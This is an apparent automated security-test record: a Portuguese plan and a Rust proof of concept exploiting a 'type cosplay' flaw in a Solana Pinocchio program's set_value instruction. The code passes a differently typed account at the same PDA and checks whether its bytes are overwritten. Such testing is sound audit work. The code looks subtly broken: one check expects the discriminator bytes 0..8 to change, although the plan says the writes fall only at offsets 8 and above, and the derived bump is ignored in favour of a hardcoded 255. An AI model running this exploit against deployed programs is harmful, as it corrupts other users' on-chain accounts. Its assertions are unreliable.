{"plan": "O programa set_value (Pinocchio) escreve em offsets fixos (8..40 user, 40..48 value, 48 bump) sem validar discriminador de tipo. O PDA e derivado de [b'data', user, bump], entao o atacante pode criar/fornecer uma conta com layout diferente no mesmo endereco PDA. O baseline chama set_value legitimamente com uma conta de dados de layout esperado; o ataque fornece uma conta de outro tipo (discriminador diferente) no mesmo PDA, e o efeito medido e que os bytes 8..40 passam a conter a chave do usuario, corrompendo o layout alheio.", "scenario": "let user = Pubkey::new_unique();
let bump: u8 = 255;
let (pda, _) = Pubkey::find_program_address(&[b"data", user.as_ref()], &env.program_id);

// Conta de dados legitima: discriminador do tipo esperado + campos
let mut legit_data = vec![0u8; 64];
legit_data[0..8].copy_from_slice(&[1u8; 8]);
let legit_account = account(&env.program_id, &legit_data, None);

let user_account = wallet(1_000_000_000);

let ix_data = {
    let mut d = vec![0u8];
    d.push(bump);
    d.extend_from_slice(&42u64.to_le_bytes());
    d
};

let metas = vec![
    AccountMeta::new(pda, false),
    AccountMeta::new_readonly(user, false),
];

let ix = env.raw_ix(&ix_data, metas.clone());
let contas = vec![(pda, legit_account.clone()), (user, user_account.clone())];

let base = env.baseline("set_value legitimo", &ix, &contas);

// Ataque COSPLAY: mesma instrucao, mas conta de dados com discriminador diferente
let mut cosplay_data = vec![0u8; 64];
cosplay_data[0..8].copy_from_slice(&[9u8; 8]);
let cosplay_account = account(&env.program_id, &cosplay_data, None);

let atk_contas = vec![(pda, cosplay_account), (user, user_account)];
let r = env.attack("cosplay: conta de outro tipo no PDA", &ix, &atk_contas);

if r.program_result == ProgramResult::Success {
    let after_data = after(&r, &pda).data();
    let user_bytes = user.to_bytes();
    env.effect(
        "conta de outro tipo foi sobrescrita com a chave do usuario nos offsets 8..40",
        after_data.len() >= 40 && after_data[8..40] == user_bytes,
    );
    env.effect(
        "discriminador original da conta cosplay foi corrompido",
        after_data.len() >= 8 && after_data[0..8] != [9u8; 8],
    );
}
"}

